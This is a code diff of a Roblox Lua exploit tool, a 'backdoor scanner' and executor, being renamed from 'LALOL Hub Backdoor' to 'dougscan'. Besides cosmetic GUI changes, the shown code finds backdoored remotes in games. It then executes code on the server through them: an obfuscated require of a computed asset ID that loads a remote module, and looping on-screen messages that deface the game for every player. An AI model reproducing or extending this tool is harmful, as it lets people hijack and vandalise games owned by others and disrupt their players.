@@ -184,15 +184,15 @@ G2L["1d"] = Instance.new("TextLabel", G2L["2"]);
 G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["1d"]["FontFace"] = Font.new([[rbxassetid://12187365977]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["1d"]["TextSize"] = 49;
-G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
 G2L["1d"]["Size"] = UDim2.new(0, 460, 0, 50);
-G2L["1d"]["Text"] = [[doug]];
+G2L["1d"]["Text"] = [[dougscan private]];
 G2L["1d"]["BackgroundTransparency"] = 1;
 G2L["1d"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.025362318381667137, 0);
 
 -- StarterGui.LALOL Hub Backdoor.Frame.TextLabel.UIStroke
 G2L["1e"] = Instance.new("UIStroke", G2L["1d"]);
-G2L["1e"]["Color"] = Color3.fromRGB(255, 255, 255);
+G2L["1e"]["Color"] = Color3.fromRGB(255, 155, 0);
 
 -- StarterGui.LALOL Hub Backdoor.Frame.TextLabel.UIStroke.UIGradient
 G2L["1f"] = Instance.new("UIGradient", G2L["1e"]);
@@ -1448,7 +1448,7 @@ local script = G2L["20"];
 		game:GetService('StarterGui'):SetCore(
 			"SendNotification",
 			{
-				Title = "LALOL Hub Backdoor",
+				Title = "dougscan",
 				Duration = 6,
 				Text = text
 			}
@@ -1552,16 +1552,16 @@ local script = G2L["20"];
 				
 				if workspace:FindFirstChild(code) then
 					
-					notify('Backdoor found! '..os.clock()-timee..'s')
+					notify('backadoora founda '..os.clock()-timee..'s')
 					
 					backdoor=remote
 					debug(remote:GetFullName(), 3)
 					GUI.Scanner.Visible=false
 					makeVisible(GUI.Executor, true)
 	
-	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='doug'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
+	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='Found Backdoor, Scanned by dougscan v2'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
 					runRemote(remote, "require(171016405.1884*69)")			
-					runRemote(remote, "a=Instance.new('Hint')a.Text='dou'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					runRemote(remote, "a=Instance.new('Hint')a.Text='Found Backdoor, Scanned by dougscan v2'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
